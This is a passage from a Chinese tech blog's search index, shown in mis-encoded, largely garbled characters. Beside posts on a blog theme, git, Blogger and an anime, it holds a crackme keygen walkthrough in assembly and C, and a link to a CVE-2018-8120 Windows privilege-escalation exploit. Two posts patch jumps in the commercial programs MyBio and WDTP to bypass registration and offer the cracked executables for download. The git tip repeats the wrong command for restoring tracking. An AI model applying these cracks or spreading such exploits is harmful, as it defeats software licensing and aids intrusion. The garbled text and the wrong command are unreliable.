ä¸Šæ³¨é‡Šå³å¯\nå†™åœ¨æœ€å è‡´è°¢ ç‰¹åˆ«æ„Ÿè°¢Yumoeæä¾›äº†è¿™ä¹ˆç®€æ´å¤§æ–¹çš„ä¸»é¢˜\n","permalink":"https://www.hacktech.cn/post/ink-theme-story.html","summary":"\u003ch2 id=\"ä¸»é¢˜ä»‹ç»\"\u003eä¸»é¢˜ä»‹ç»\u003c/h2\u003e\n\u003cp\u003eä¸ºçº¸å°å¢¨å†™çš„ä¸€æ¬¾ä¸»é¢˜,è¯¥ä¸»é¢˜ç§»æ¤è‡ª\u003ca href=\"https://yumoe.com\"\u003eYumoe\u003c/a\u003e\u003c/p\u003e\n\u003c!--å’Œ[Artifact.](https://artifact.me/)--\u003e\n\u003cp\u003egithubåœ°å€ï¼š\u003ca href=\"https://github.com/akkuman/ink-theme-story\"\u003eink-theme-story\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"demo\"\u003eDemo\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://ink-theme-story.pancakeapps.com\"\u003eink-theme-story\u003c/a\u003e\u003c/p\u003e","title":"çº¸å°å¢¨inkç®€æ´ä¸»é¢˜storyçˆ±ä¸Šä½ çš„æ•…äº‹"},{"content":"é¡¹ç›®å¼€å‘è¿‡ç¨‹ä¸­ï¼Œä¼šé‡åˆ°æœ¬åœ°é…ç½®æ–‡ä»¶æ¯ä¸ªå¼€å‘äººå‘˜ä¸åŒçš„æƒ…å†µï¼Œä½†å¦‚æœé‡åˆ°ç±»ä¼¼æ•°æ®åº“é…ç½®è¿™ç§æœ€ç»ˆéœ€è¦åŠ å…¥ git ç‰ˆæœ¬æ§åˆ¶çš„é…ç½®ï¼Œåˆ™ä¼šé™·å…¥ä¸¤éš¾å¢ƒåœ°ã€‚è¦ä¹ˆä¸è·Ÿè¸ªï¼Œè¦ä¹ˆæœ‰äººæäº¤åå…¶ä»–äººåŒæ­¥ä¸‹æ¥å¿…é¡»æ‰‹åŠ¨ä¿®æ”¹ï¼Œéå¸¸éº»çƒ¦ã€‚å…¶å®ï¼Œå¯¹äºå·²è¢«çº³å…¥ç‰ˆæœ¬ç®¡ç†çš„æ–‡ä»¶ï¼Œgit ä¹Ÿæä¾›äº†å¾ˆå¥½çš„è§£å†³åŠæ³•ã€‚\nå‘Šè¯‰gitå¿½ç•¥å¯¹å·²ç»çº³å…¥ç‰ˆæœ¬ç®¡ç†çš„æ–‡ä»¶ .classpath çš„ä¿®æ”¹ï¼Œgit ä¼šä¸€ç›´å¿½ç•¥æ­¤æ–‡ä»¶ç›´åˆ°é‡æ–°å‘Šè¯‰ git å¯ä»¥å†æ¬¡è·Ÿè¸ªæ­¤æ–‡ä»¶ $ git update-index --assume-unchanged .classpath\nå‘Šè¯‰ git æ¢å¤è·Ÿè¸ª $ git update-index --assume-unchanged .classpath\næŸ¥çœ‹å½“å‰è¢«å¿½ç•¥çš„ã€å·²ç»çº³å…¥ç‰ˆæœ¬åº“ç®¡ç†çš„æ–‡ä»¶ï¼š$ git ls-files -v | grep -e \u0026quot;^[hsmrck]\u0026quot;\n","permalink":"https://www.hacktech.cn/post/git-update-index.html","summary":"\u003cp\u003eé¡¹ç›®å¼€å‘è¿‡ç¨‹ä¸­ï¼Œä¼šé‡åˆ°æœ¬åœ°é…ç½®æ–‡ä»¶æ¯ä¸ªå¼€å‘äººå‘˜ä¸åŒçš„æƒ…å†µï¼Œä½†å¦‚æœé‡åˆ°ç±»ä¼¼æ•°æ®åº“é…ç½®è¿™ç§æœ€ç»ˆéœ€è¦åŠ å…¥ git ç‰ˆæœ¬æ§åˆ¶çš„é…ç½®ï¼Œåˆ™ä¼šé™·å…¥ä¸¤éš¾å¢ƒåœ°ã€‚è¦ä¹ˆä¸è·Ÿè¸ªï¼Œè¦ä¹ˆæœ‰äººæäº¤åå…¶ä»–äººåŒæ­¥ä¸‹æ¥å¿…é¡»æ‰‹åŠ¨ä¿®æ”¹ï¼Œéå¸¸éº»çƒ¦ã€‚å…¶å®ï¼Œå¯¹äºå·²è¢«çº³å…¥ç‰ˆæœ¬ç®¡ç†çš„æ–‡ä»¶ï¼Œgit ä¹Ÿæä¾›äº†å¾ˆå¥½çš„è§£å†³åŠæ³•ã€‚\u003c/p\u003e","title":"gitå¿½ç•¥å¯¹å·²å…¥åº“æ–‡ä»¶çš„ä¿®æ”¹"},{"content":"blogger(blogspot)è‡ªå¸¦çš„æ˜¯æ²¡æœ‰ä»£ç é«˜äº®çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸‹é¢çš„æ–¹æ³•æ·»åŠ ä»£ç é«˜äº®ã€‚\né¦–å…ˆæˆ‘ä»¬æ‰“å¼€blogger(blogspot)åå°ï¼Œç„¶åç‚¹å‡»ä¸»é¢˜èƒŒæ™¯--\u0026gt;ä¿®æ”¹htmlï¼Œç„¶ååœ¨å¼¹å‡ºçš„çª—å£å³ä¸Šè§’æœç´¢(search)\u0026lt;/head\u0026gt;ï¼Œç„¶ååœ¨\u0026lt;/head\u0026gt;ä¹‹å‰æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 5 \u0026lt;!-- highlight.js Additions START --\u0026gt; \u0026lt;link href=\u0026#39;//cdn.bootcss.com/highlight.js/9.12.0/styles/atom-one-light.min.css\u0026#39; rel=\u0026#39;stylesheet\u0026#39;/\u0026gt; \u0026lt;script src=\u0026#39;//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js\u0026#39;/\u0026gt; \u0026lt;script\u0026gt;hljs.initHighlightingOnLoad();\u0026lt;/script\u0026gt; \u0026lt;!-- highlight.js Additions END --\u0026gt; å…¶ä¸­ç‰ˆæœ¬å·9.12.0å’Œjsä»¥åŠcsséƒ½æ˜¯å¯ä»¥è‡ªè¡Œæ›´æ”¹çš„ï¼Œæˆ‘åªæ˜¯é€‰äº†æˆ‘è¿™ä¸ªæ—¶é—´ä¸Šæœ€æ–°çš„ç‰ˆæœ¬ï¼Œå¹¶ä¸”é€‰äº†æ¯”è¾ƒé€‚åˆæœ¬äººbloggerçš„é…è‰²ï¼Œè¿™äº›éƒ½æ˜¯å¯ä»¥è‡ªè¡Œæ›´æ”¹çš„ã€‚\n","permalink":"https://www.hacktech.cn/post/blogger-code-highlight.html","summary":"\u003cp\u003eblogger(blogspot)è‡ªå¸¦çš„æ˜¯æ²¡æœ‰ä»£ç é«˜äº®çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸‹é¢çš„æ–¹æ³•æ·»åŠ ä»£ç é«˜äº®ã€‚\u003c/p\u003e","title":"bloggeræ·»åŠ ä»£ç é«˜äº®"},{"content":" ","permalink":"https://www.hacktech.cn/post/64bit-register-and-rule.html","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://raw.githubusercontent.com/akkuman/pic/master/pic/2021/8/a59100f7b3d90135c5bf1e5e2eb8e524..png\" alt=\"enter description here\"  /\u003e\n\u003c/p\u003e","title":"64ä½é€šç”¨å¯„å­˜å™¨åŠå…¶ä¸€èˆ¬ä½œç”¨"},{"content":"æ¥æº : bigric3/cve-2018-8120\nDetail : cve-2018-8120-analysis-and-exploit\næ¼”ç¤ºå›¾ ä¸‹è½½ CVE-2018-8120.zip\n","permalink":"https://www.hacktech.cn/post/cve-2018-8120.html","summary":"\u003cp\u003eæ¥æº : \u003ca href=\"https://github.com/bigric3/cve-2018-8120\"\u003ebigric3/cve-2018-8120\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eDetail : \u003ca href=\"http://bigric3.blogspot.com/2018/05/cve-2018-8120-analysis-and-exploit.html\"\u003ecve-2018-8120-analysis-and-exploit\u003c/a\u003e\u003c/p\u003e","title":"CVE-2018-8120 Windowsæƒé™æå‡"},{"content":"è¿™ä¸¤å¤©æŠŠæ¥è‡ªæ·±æ¸Šè¡¥ç•ªå®Œäº†ï¼Œæ²»æ„ˆç³»ï¼Ÿä¸æ˜¯ï¼Œçœ‹èµ·æ¥ç”»é£ç¡®å®æ˜¯è¿™æ ·ï¼Œä½†æ˜¯ç»†çœ‹ä¹‹ä¸‹å…¶å®èƒ½æ„Ÿå—åˆ°æ•…äº‹æ‰€æè¿°çš„æ®‹å¿ä¸é»‘æš—ã€‚\nè‰å¯çš„èº«ä¸–åŸæ¥åªæ˜¯ä¸€ä¸ªå¯ä»¥åŠ¨çš„å°¸ä½“ï¼ŒåŸæ¥é™¤å’’ä¹‹ç¬¼å¹¶ä¸èƒ½æŠµæŠ—æ·±æ¸Šçš„è¯…å’’ã€‚\nå…¶å®å¯ä»¥ç»†æƒ³ï¼Œè‰å¯åœ¨ä¸Šå‡çš„è¿‡ç¨‹ä¸­ä¸æ–­æ‰¿å—è¯…å’’ä¸€æ¬¡æ¬¡çš„æ­»äº¡ã€‚\nåœ¨è§åˆ°ä¸åŠ¨å¿å¥¥æ£®çš„æ—¶å€™ï¼Œå¥¥æ£®å‘Šè¯‰äº†è‰å¯è¿™ä¸ªæ®‹é…·çš„äº‹å®ï¼Œè€Œå´æ²¡æœ‰è¿‡å¤šçš„å¯¹è‰å¯å¿ƒç†è¿›è¡Œæè¿°ï¼Œå…¨æ˜¯æå†™çš„å¥¥æ£®å’Œç´¯æ ¼ï¼Œè¿˜çœŸæ˜¯æ— æƒ…å‘¢ã€‚\næˆ‘æŒºå–œæ¬¢å¥¥æ£®è¿™ä¸ªäººçš„ï¼Œå­¤å‚²æˆ–è€…è¯´å‚²å¨‡ã€‚\nåœ¨å·¨äººä¹‹æ¯ï¼Œå‰§æƒ…ç”»é£æ€¥è½¬è€Œä¸‹ï¼Œè‰å¯çš„æ¿’æ­»æ˜¯å¦‚æ­¤çœŸå®ã€‚\néƒ½è¯´å¨œå¨œçªæ˜¯è€å©†ï¼Œå…¶å®æˆ‘è§‰å¾—å¨œå¨œçªè¿™ä¸ªäººç‰©æŒºå¯æ‚²çš„ï¼Œä¸æ˜¯å› ä¸ºä»–çš„ç»å†ï¼Œå½“ç„¶ä»–çš„ç»å†æ˜¯ä¸€éƒ¨åˆ†ï¼Œæˆ‘è§‰å¾—æˆ‘è§‰å¾—ä»–å¯æ‚²æ›´å¤šæ˜¯ä»–ä»æ¥æ²¡æœ‰ä¸ºè¿‡è‡ªå·±åšè¿‡ä»€ä¹ˆäº‹æƒ…ï¼Œä¸€ç›´æ´»åœ¨æœŸå¾…ä¹‹ä¸­ã€‚\nå¦å¤–ï¼Œæˆ‘æƒ³è¯´ä¸€ä¸‹ï¼Œå¨œå¨œçªä¸æ˜¯ç”·å­©å­å—ï¼Œä¸ºä»€ä¹ˆæ˜¯è€å©†ã€‚\nä¸‹ä¸€å­£åº”è¯¥ä¼šç¢°åˆ°é»æ˜å¿äº†ï¼Œæ„Ÿè§‰ä»–è¿™ä¸ªäººæŒºé»‘æš—çš„ï¼Œä¸çŸ¥é“å…·ä½“æ€æ ·ã€‚\n","permalink":"https://www.hacktech.cn/post/made-in-abyss.html","summary":"\u003cp\u003eè¿™ä¸¤å¤©æŠŠæ¥è‡ªæ·±æ¸Šè¡¥ç•ªå®Œäº†ï¼Œæ²»æ„ˆç³»ï¼Ÿä¸æ˜¯ï¼Œçœ‹èµ·æ¥ç”»é£ç¡®å®æ˜¯è¿™æ ·ï¼Œä½†æ˜¯ç»†çœ‹ä¹‹ä¸‹å…¶å®èƒ½æ„Ÿå—åˆ°æ•…äº‹æ‰€æè¿°çš„æ®‹å¿ä¸é»‘æš—ã€‚\u003c/p\u003e","title":"è¡¥ç•ªå®Œäº† æ¥è‡ªæ·±æ¸Š"},{"content":" æŸ¥å£³æ— å£³ï¼Œvcå†™çš„ã€‚\næˆ‘ä»¬è¾“å…¥å‡ç åï¼Œç„¶åç‚¹å‡»ï¼Œå¼¹å‡ºé”™è¯¯æ¡†ï¼Œç›´æ¥æ‰“å¼€odï¼Œå¯¹MessageBoxAä¸‹æ–­ç‚¹ä¹Ÿè¡Œï¼Œå¯»æ‰¾å­—ç¬¦ä¸²ä¹Ÿè¡Œã€‚\nä¸€èˆ¬çš„é”™è¯¯æç¤ºéƒ¨åˆ†ä»£ç ç±»ä¼¼äºè¿™æ ·ã€‚\n1 2 3 4 5 6 7 8 9 call xxx test xxx,xxx je xxxerror ... jmp xxx push xxx ;xxxerror ... call error åªéœ€è¦å¾€ä¸Šæ‰¾åˆ°å…³é”®è·³ç›´æ¥nopå°±è¡Œã€‚ä¸è¿‡æˆ‘ä»¬éœ€è¦è·Ÿè¸ªä¸€ä¸‹ç®—æ³•ã€‚\næˆ‘ä»¬æ‰¾åˆ°å…³é”®è·³çš„callä¸Šæ–¹ä¸‹æ–­ï¼Œå¯ä»¥çœ‹åˆ°ä»–æŠŠä¸€ä¸ªä¸œè¥¿å‹æ ˆäº†ï¼Œå¯ä»¥çŒœæƒ³æ˜¯çœŸç ã€‚\nç„¶åæˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹111111å’Œ1643803416ï¼Œæç¤ºæ­£ç¡®ï¼Œé‚£æˆ‘ä»¬æ‰¾åˆ°è¿™æ®µçš„æ®µé¦–ä¸‹æ–­ï¼Œç„¶åf9è¿è¡Œç¨‹åºé‡æ–°è¾“å…¥å‡ç ç‚¹å‡»Checkã€‚é‡ç‚¹è§‚å¯Ÿ1643803416çš„å‡ºç°åœ°ã€‚\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨å…³é”®callçš„å‰æ–¹ä¸è¿œå¤„å°±æœ‰å‡ºç°ï¼Œé‚£ä¹ˆè¿™ä¸ªaddå‰æ–¹çš„callæ˜¯åŠ å¯†ç®—æ³•callå—ï¼Ÿ\næ˜¾ç„¶ä¸æ˜¯çš„ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªCString::Formatæ˜æ˜¾æ˜¯å¯¹ä¸€ä¸ªä¸œè¥¿è¿›è¡Œå­—ç¬¦ä¸²æ ¼å¼åŒ–ï¼Œæ ¼å¼æ˜¯%lu(æ— ç¬¦å·é•¿æ•´æ•°)ï¼Œå¦å¤–æˆ‘ä»¬å¯ä»¥åœ¨å®ƒä¸Šé¢Enterè·Ÿä¸€è·Ÿï¼Œå¯ä»¥å‘ç°ç›´æ¥ä»ç¨‹åºé¢†ç©ºè·³åˆ°ç³»ç»Ÿé¢†ç©ºäº†ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥çŒœæµ‹å‰é¢è‚¯å®šæ˜¯1643803416çš„ä¸€ä¸ªä»€ä¹ˆæ•°å­¦å½¢å¼ç„¶åç”¨%luæ ¼å¼åŒ–è¾“å‡ºï¼Œæˆ‘ä»¬å¯ä»¥æ¨æµ‹æ˜¯16è¿›åˆ¶ï¼Œç„¶åæˆ‘ä»¬å†é‡æ–°æ¥æ³¨æ„ä¸€ä¸‹å‰é¢ã€‚\næˆ‘ä»¬å‘ç°äº†1643803416çš„åå…­è¿›åˆ¶ï¼Œåœ¨ä¸Šæ–¹æœ‰ä¸ªå¾ªç¯ã€‚å…¶å®ä¹‹å‰åœ¨f8ä¸‹æ¥çš„æ—¶å€™ï¼Œé‚£ä¸ªå¾ªç¯æˆ‘ä»¬å°±å¯ä»¥æ¨æµ‹æ˜¯ç®—æ³•ï¼Œç°åœ¨ç»è¿‡åˆ†æå¯ä»¥æ›´åŠ è‚¯å®šäº†ã€‚mov eax,[local.4]è¿™ä¸ªæ˜¯è¿™ä¸ªå¾ªç¯æœ€ç»ˆè·³å‡ºæ¥çš„åœ°æ–¹ï¼Œé‚£ä¹ˆlocal.4é‚£é‡Œå°±æ˜¯æˆ‘ä»¬æ‰€éœ€è¦æ‰¾çš„ä¸œè¥¿ã€‚\nåœ¨æˆ‘ä»¬ä¹‹å‰çš„ä¸¤è¾¹è·Ÿä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æµ‹è¯•å‘ç°local.7æ˜¯ä½ è¾“å…¥çš„Nameçš„é•¿åº¦ï¼Œlocal.5æ˜¯æˆ‘ä»¬è¾“å…¥çš„åå­—ã€‚\næˆ‘ä»¬æŠŠä¸Šé¢çš„å¾ªç¯å¥½å¥½è·Ÿä¸€éã€‚ä¸‹é¢ç›´æ¥çœ‹æˆ‘æ³¨é‡Šç†è§£å§ã€‚å¯¹äº†ï¼Œæˆ‘ä»¬è·Ÿè¸ªè¿‡ç¨‹ä¸­ä¹Ÿå¯ä»¥å‘ç°Nameé•¿åº¦ä¸èƒ½å°äº5ï¼Œå°±åœ¨è¿™ä¸ªå¾ªç¯ä¸Šæ–¹æœ‰ä¸ªç®€å•çš„åˆ¤æ–­ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 004015BE |\u0026gt; \\C745 E0 00000\u0026gt;mov [local.8],0x0 004015C5 |. EB 09 jmp short Brad_Sob.004015D0 004015C7 |\u0026gt; 8B55 E0 /mov edx,[local.8] 004015CA |. 83C2 01 |add edx,0x1 004015CD |. 8955 E0 |mov [local.8],edx ; local8ç¬¬ä¸€æ¬¡è¿›å…¥å¾ªç¯ä¸º0ï¼Œåç»­å¾ªç¯æ¯æ¬¡+1 004015D0 |\u0026gt; 8B45 E0 mov eax,[local.8] 004015D3 |. 3B45 E4 |cmp eax,[local.7] ; local7 = len(name) 004015D6 |. 7D 42 |jge short Brad_Sob.0040161A ; å½“local8\u0026gt;=len(name)è·³å‡ºå¾ªç¯ 004015D8 |. 8B4D E0 |mov ecx,[local.8] 004015DB |. 51 |push ecx 004015DC |. 8D4D EC |lea ecx,[local.5] ; local5=name 004015DF |. E8 1C030000 |call Brad_Sob.00401900 ; å–name[local8]çš„åå…­è¿›åˆ¶asciiæ”¾å…¥al 004015E4 |. 0FBED0 |movsx edx,al 004015E7 |. 8B45 F0 |mov eax,[local.4] ; local4åˆå§‹å€¼ä¸º0x81276345 004015EA |. 03C2 |add eax,edx 004015EC |. 8945 F0 |mov [local.4],eax ; local4 += name[local8]çš„åå…­è¿›åˆ¶ 004015EF |. 8B4D E0 |mov ecx,[local.8] 004015F2 |. C1E1 08 |shl ecx,0x8 004015F5 |. 8B55 F0 |mov edx,[local.4] 004015F8 |. 33D1 |xor edx,ecx 004015FA |. 8955 F0 |mov [local.4],edx ; local4 = (local8\u0026lt;\u0026lt;8)^local4 004015FD |. 8B45 E0 |mov eax,[local.8] 00401600 |. 83C0 01 |add eax,0x1 00401603 |. 8B4D E4 |mov ecx,[local.7] 00401606 |. 0FAF4D E0 |imul ecx,[local.8] 0040160A |. F7D1 |not ecx 0040160C |. 0FAFC1 |imul eax,ecx ; eax = (~(len(name)*local8))*(local8+1) 0040160F |. 8B55 F0 |mov edx,[local.4] 00401612 |. 0FAFD0 |imul edx,eax 00401615 |. 8955 F0 |mov [local.4],edx ; local4 *= eax 00401618 |.^ EB AD \\jmp short Brad_Sob.004015C7 0040161A |\u0026gt; 8B45 F0 mov eax,[local.4] ç›¸ä¿¡ç»“åˆæˆ‘çš„æ³¨é‡Šè‡ªå·±ç»†çœ‹ä¸€éåº”è¯¥ä¸å¤ªè´¹åŠ›ã€‚ä¸‹é¢ç›´æ¥å†™æ³¨å†Œç®—æ³•ã€‚å…¶å®ä¸Šé¢çš„åŸºæœ¬ä¸Šç”¨ä¼ªä»£ç éƒ½å†™çš„æ¯”è¾ƒæ˜ç™½äº†ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { // nameä¸ºè¾“å…¥çš„ç¬¬ä¸€ä¸ªå€¼ char* name = \u0026#34;111111\u0026#34;; int len_name = strlen(name); if (len_name\u0026lt;5) // nameå°äº5å‡ºç°æç¤ºå¹¶é€€å‡º printf(\u0026#34;User Name must have at least 5 characters.\\n\u0026#34;); else { long result = 0x81276345; for(int i = 0; i \u0026lt; len_name; i++) { result += name[i]; result ^= (i\u0026lt;\u0026lt;8); result *= ~(len_name*i)*(i+1); } printf(\u0026#34;result: %lu\\n\u0026#34;,result); } return 0; } ","permalink":"https://www.hacktech.cn/post/160crackme-019.html","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1foyrcq7eydj207004jgli.jpg\" alt=\"\"  /\u003e\n\u003c/p\u003e","title":"160CrackMeç¬¬åä¹Brad Soblesky.2"},{"content":"æ—¢ç„¶å¼€å§‹äº†ï¼Œå°±æŠŠè¿™ä¸€ä¸ªç³»åˆ—çš„éƒ½ç ´äº†ç®—äº†ï¼Œè¿™æ¬¡ä¸»è§’å°éšæœ¬è®°MyBio\nå’ŒWDTPçš„åŸç†æ˜¯å·®ä¸å¤šçš„ï¼Œå…ˆæŠŠè½¯ä»¶ç•Œé¢æ¢æˆeæ–‡ï¼Œç„¶åå†™äº†15ä¸ªè®°å½•åæç¤ºæ³¨å†Œï¼Œä¸€æ ·çš„è·¯å­ï¼Œç›´æ¥è·³è¿‡æ³¨å†Œçª—å£çš„å¼¹å‡ºå°±å¥½äº†\nç„¶åæŸ¥å£³ä¸€æ ·æ˜¯vs2015çš„æ— å£³64ä½ç¨‹åºï¼Œç›´æ¥é™„åŠ åˆ°x64dbgï¼Œç„¶åæœ‰äº†ä¹‹å‰WDTPçš„ç»éªŒï¼Œæˆ‘ä»¬ç›´æ¥æ‰¾å¼¹å‡ºæ³¨å†Œçª—å£çš„åœ°æ–¹ï¼ŒæŸ¥æ‰¾å­—ç¬¦ä¸²ï¼Œç„¶åæœç´¢ä¸Šå›¾ä¸­Serial-number:\nä¸€æ ·çš„ï¼Œæ‰¾åˆ°äº†æ³¨å†Œçª—ä½“ç”Ÿæˆçš„åœ°æ–¹ï¼Œåœ¨æ®µé¦–ä¸‹ä¸ªæ–­ï¼Œç„¶åå›æº¯ä¸€æ¬¡ï¼Œå¯ä»¥çœ‹åˆ°\nç›´æ¥æŠŠè¿™ä¸ªcallä¸Šæ–¹çš„jleæ”¹æˆjmpå³å¯çˆ†ç ´ã€‚\nè½¯ä»¶ä¸‹è½½åœ°å€ï¼š\nå¯†ç ï¼š0yb0cz\nè§£å‹åæ³¨æ„æ ¡éªŒ\n1 2 3 4 5 6 å¤§å°: 4181504 å­—èŠ‚ æ–‡ä»¶ç‰ˆæœ¬: 2.1.1004 ä¿®æ”¹æ—¶é—´: 2018å¹´2æœˆ28æ—¥, 21:27:02 MD5: EEA6B0BF010E45EA7EF340FFB543C316 SHA1: BAA4BE7B3F2DE0F75996C0E9BE8DA0C177444CE8 CRC32: 999277D5 ","permalink":"https://www.hacktech.cn/post/mybio-crack.html","summary":"\u003cp\u003eæ—¢ç„¶å¼€å§‹äº†ï¼Œå°±æŠŠè¿™ä¸€ä¸ªç³»åˆ—çš„éƒ½ç ´äº†ç®—äº†ï¼Œè¿™æ¬¡ä¸»è§’å°éšæœ¬è®°MyBio\u003c/p\u003e","title":"MyBioå°éšæœ¬è®°æ³¨å†Œç ´è§£"},{"content":"ä»Šå¤©æ¥è®²è®²WDTPè¿™ä¸ªè½¯ä»¶çš„ç ´è§£ã€‚\nç®€ä»‹ WDTP ä¸æ­¢æ˜¯ä¸€æ¬¾å¼€æºå…è´¹çš„ GUI æ¡Œé¢å•æœºç‰ˆé™æ€ç½‘ç«™ç”Ÿæˆå™¨å’Œç®€å•æ–¹ä¾¿çš„å‰ç«¯å¼€å‘å·¥å…·ï¼Œæ›´æ˜¯ä¸€æ¬¾è·¨å¹³å°çš„é›†ç¬”è®°ã€ä¸ªäººçŸ¥è¯†ç®¡ç†ã€å†™ä½œ/åˆ›ä½œã€åšå®¢/ç½‘ç«™å†…å®¹ä¸æ ·å¼ç®¡ç†ç­‰åŠŸèƒ½äºä¸€ä½“çš„å¤šåˆä¸€å†…å®¹å¤„ç†/ç®¡ç†å™¨ï¼ŒåŒæ—¶è¿˜æ˜¯ä¸€æ¬¾é«˜åº¦è¿½æ±‚ç”¨æˆ·ä½“éªŒä¸è®¡ç®—æœºæ–‡æœ¬ç¼–å†™è‰¯å¥½æ„Ÿå—çš„ Markdown ç¼–è¾‘å™¨ã€‚è¯¥è½¯ä»¶ç ”å‘çš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼šç®€æ´é«˜æ•ˆã€è½»çµä¼˜é›…ã€å…ˆè¿›å¼ºæ‚ã€æ“ä½œç®€å•ã€‚\nç ´è§£ ä¹‹å‰è¿™ä¸ªè½¯ä»¶æ˜¯å¼€æºçš„ï¼Œåæ¥ä½œè€…æŠŠå®ƒé—­æºäº†ï¼Œç„¶ååŠ ä¸Šäº†æ³¨å†Œæœºåˆ¶ï¼Œæˆ‘ä»Šå¤©æµ‹è¯•äº†ä¸€ä¸‹ï¼Œåœ¨æˆ‘å†™äº†åå¤šç¯‡æ–‡ç« ä¹‹åæˆ‘å†æ·»åŠ å°±æç¤ºæˆ‘éœ€è¦æ³¨å†Œã€‚ æŸ¥ä¸€ä¸‹å£³ï¼Œæ²¡æœ‰å£³ï¼Œ64ä½çš„ ç›´æ¥é™„åŠ åˆ°x64dbgä¸­ï¼Œç„¶åæˆ‘ä»¬æœç´¢ä¸€ä¸‹å­—ç¬¦ä¸²serialï¼Œå¯ä»¥æ‰¾åˆ°é”™è¯¯æç¤ºçš„åœ°æ–¹ã€‚ æˆ‘ä»¬åæ±‡ç¼–çª—å£ä¸­ä¸‹ä¸ªæ–­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸Šæ–¹çš„retï¼Œè¯´æ˜æç¤ºé”™è¯¯ä¿¡æ¯æ˜¯è·³è½¬è¿›æ¥çš„ï¼Œç„¶åæˆ‘ä»¬åœ¨æ®µé¦–ä¸‹å¥½æ–­ï¼Œé‡æ–°æ³¨å†Œå¯ä»¥æ‰¾åˆ°è°ƒç”¨è¿™é‡Œçš„åœ°æ–¹ æˆ‘ä»¬è·Ÿè¿‡å» å¯ä»¥çœ‹åˆ°é”™è¯¯æç¤ºçš„callï¼Œè¿™ä¸ªcallä¸Šæ–¹æœ‰ä¸€ä¸ªjmpå¯ä»¥è·³è¿‡ï¼Œè¯´æ˜åœ¨å‰æ–¹åº”è¯¥æœ‰ä¸€ä¸ªè·³è½¬è·³è¿‡äº†è¿™ä¸ªjmpï¼Œç›´æ¥è·³åˆ°äº†è¿™ä¸ªé”™è¯¯æç¤ºcallã€‚æˆ‘ä»¬å†å¾€å‰çœ‹ä¸€ç‚¹ã€‚ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„jeï¼Œjeå‰é¢çš„callæ˜¯ä¸€ä¸ªå¯¹æ¯”çš„callï¼Œçˆ†ç ´çš„è¯ï¼Œæˆ‘ä»¬ä¸ç®¡è¿™ä¸ªï¼Œç›´æ¥æŠŠjeç»™nopæ‰ã€‚ ç„¶åæˆ‘ä»¬æ‰§è¡Œï¼Œå‘ç°è¿˜æ˜¯ç‚¹å‡»æ–°å»ºå°±ä¼šå¼¹å‡ºæ¥æ³¨å†Œæ¡†ï¼ŒåŠŸèƒ½æ— æ³•ä½¿ç”¨ã€‚ æˆ‘ä»¬ç»§ç»­åœ¨å­—ç¬¦ä¸²ä¸­æ‰¾ï¼Œå¯ä»¥çœ‹åˆ°çª—å£ä¸Šé¢çš„Purchaseï¼ŒQuestionç­‰ç­‰å­—ç¬¦ï¼Œå¯ä»¥å‘ç°é”™è¯¯æç¤ºçš„ä¸Šé¢ä¸€æ®µå°±æ˜¯è¿™ä¸ªæ³¨å†Œçª—å£å¼¹å‡ºçš„ä¸€æ®µï¼Œæˆ‘ä»¬ä¾æ—§åœ¨è¿™ä¸ªæ®µçš„æ®µé¦–ä¸‹æ®µï¼Œç„¶åæ‰¾åˆ°è°ƒç”¨å®ƒï¼ˆå¼¹æ³¨å†Œçª—ï¼‰çš„åœ°æ–¹ã€‚ å®ƒæ˜¯ç›´æ¥jmpä¸‹æ¥çš„ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸Šé¢æœ‰ä¸€ä¸ªcallä¹‹åè·Ÿç€ä¸€ä¸ªtestç„¶åä¸€ä¸ªjneï¼Œæˆ‘ä»¬å¯ä»¥çŒœæƒ³æ˜¯ä½ æ–°å»ºæ–‡æ¡£çš„æ—¶å€™å…ˆæ¯”å¯¹ä¸€ä¸‹ä½ æ˜¯å¦æ³¨å†Œï¼Œç„¶åæ ¹æ®ç»“æœè·³è½¬ï¼Œæˆ‘ä»¬ç›´æ¥æŠŠjneæ”¹æˆjmpè¯•è¯•ï¼Œè®©å®ƒç›´æ¥è·³è¿‡å¼¹æ³¨å†Œçª—å£ã€‚ å®Œç¾ï¼Œç°åœ¨æ–°å»ºæ²¡é—®é¢˜äº†ã€‚\nå¯¼å‡º æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æŠŠå®ƒçš„è¿™ä¸ªå¼¹æ³¨å†Œçª—çš„åœ°æ–¹ç›´æ¥jmpè¿‡å°±å¥½ï¼Œæˆ‘ä»¬åœ¨æˆ‘ä»¬ä¿®æ”¹çš„å‘½ä»¤ä¸Šé¢å³é”®è¡¥ä¸ ç„¶åç‚¹å‡»ä¿®å¤æ–‡ä»¶å³å¯å¯¼å‡ºæˆä¸€ä¸ªç ´è§£ç‰ˆçš„exeã€‚\nä¸‹è½½ ä¸‹è½½åæ³¨æ„æ ¡éªŒä¿¡æ¯ æ–‡ä»¶ä¿¡æ¯ï¼š\n1 2 3 4 5 æ–‡ä»¶ç‰ˆæœ¬: 1.1.1004 ä¿®æ”¹æ—¶é—´: 2018å¹´2æœˆ26æ—¥, 19:40:44 MD5: 5B8DF3D4572842376EA850B8551DEEED SHA1: 